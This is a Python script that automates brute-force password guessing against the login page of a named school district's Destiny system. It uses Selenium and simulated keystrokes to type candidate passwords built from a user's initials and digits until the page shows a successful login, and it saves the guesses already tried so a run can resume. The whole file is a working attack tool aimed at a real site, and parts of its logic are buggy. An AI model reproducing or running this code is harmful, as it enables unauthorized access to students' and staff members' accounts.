import random as r
from time import sleep, time
from pickle import dump, load
import selenium.webdriver as webdriver
import keyboard as k


def combo(chars, length=9):
    passwords = []
    if length == 6:
        for a in range(0, 9):
            for b in range(0, 9):
                for c in range(0, 9):
                    for d in range(0, 9):
                        for e in range(0, 9):
                            for f in range(0, 9):
                                trial = str(a) + str(b) + str(c) + str(d) + str(e) + str(f)
                                passwords.append(chars + trial)
    if length == 8:
        for a in range(0, 9):
            for b in range(0, 9):
                for c in range(0, 9):
                    for d in range(0, 9):
                        for e in range(0, 9):
                            for f in range(0, 9):
                                for g in range(0, 9):
                                    for h in range(0, 9):
                                        trial = str(a) + str(b) + str(c) + str(d) + str(e) + str(f) + str(g) + str(h)
                                        passwords.append(chars + trial)
                                        if not (len(passwords) % 1000000):
                                            print(len(passwords))
    if length == 9:
        for a in range(0, 9):
            for b in range(0, 9):
                for c in range(0, 9):
                    for d in range(0, 9):
                        for e in range(0, 9):
                            for f in range(0, 9):
                                trial = str(a) + str(b) + str(c) + str(d) + str(e) + str(f)
                                passwords.append(chars + trial + '833')
        
        return passwords


class BruteForce:
    def __init__(self, driver, username, trynots=[]):
        self.driver = driver
        self.init_url = self.driver.current_url
        self.username = username
        self.initials = self.username[0:1].upper() + self.username[1:2].lower()
        self.ps = combo(self.initials)
        self._destiny2 = "https://destiny.district833.org/common/servlet/presentloginform.do?fromLoginLink=true/"
        self._destiny = "https://destiny.district833.org/common/servlet/handleloginform.do"
        self._destiny3 = "https://destiny.district833.org/common/servlet/presenthomeform.do?l2m=Home&tm=Home&l2m=Home"
        for i in trynots:
            self.ps.pop(self.ps.index(i))
        self.exceptions = []
        r.shuffle(self.ps)
    
    def bruteforce(self):
        starttime = time()
        try:
            file = open('trynots.dat', 'rb')
            trynots = load(file)
            file.close()
        except:
            self.cleanse_trynots()
            file = open('trynots.dat', 'rb')
            trynots = load(file)
            file.close()
        
        for i in trynots:
            try:
                self.ps.pop(self.ps.index(i))
            except:
                pass
        
        p = self.ps[0]
        for i in range(1000000):
            if k.is_pressed('Esc'):
                self.save_trynots()
                self.driver.close()
                break
            k.press_and_release('Tab')
            k.press_and_release('shift + %s,%s,%s,%s,%s,%s,%s,%s,8,3,3' % (
                p[0:1], p[1:2], p[2:3], p[3:4], p[4:5], p[5:6], p[6:7], p[7:8]))
            k.press_and_release('Enter')
            
            self.exceptions.append(p)
            self.ps.pop(0)
            p = self.ps[0]
            sleep(1.5)
            if self.driver.current_url == self._destiny3:
                print("This %s is the password." % p)
                self.driver.close()
                break
        print('It took %s seconds to find the password' % (time() - starttime))
    
    def save_trynots(self):
        file = open('trynots.dat', 'wb')
        dump(self.exceptions, file)
        file.close()

    def cleanse_trynots(self):
        file = open('trynots.dat','wb')
        dump([],file)
        file.close()


def create_webdriver(username=None, browser_type=None, driver_path=None):
    destiny2 = "https://destiny.district833.org/common/servlet/presentloginform.do?fromLoginLink=true/"
    destiny = "https://destiny.district833.org/common/servlet/handleloginform.do"
    
    if browser_type.lower() == 'chrome':
        driver = webdriver.Chrome(executable_path=driver_path, keep_alive=True)
        
        driver.get(destiny)
        for i in range(41):
            k.press_and_release('Tab')
        k.press_and_release('Enter')
        
        driver.get(destiny2)
        
        k.write(username)
        
        test = BruteForce(driver, username)
        test.bruteforce()
    
    
    
    elif browser_type.lower() == 'firefox':
        driver = webdriver.Firefox(executable_path=driver_path, keep_alive=True)
        
        driver.get(destiny)
        for i in range(40):
            k.press_and_release('Tab')
        k.press_and_release('Enter')
        
        driver.get(destiny2)
        
        k.write(username)
        
        test = BruteForce(driver, username)
        test.bruteforce()



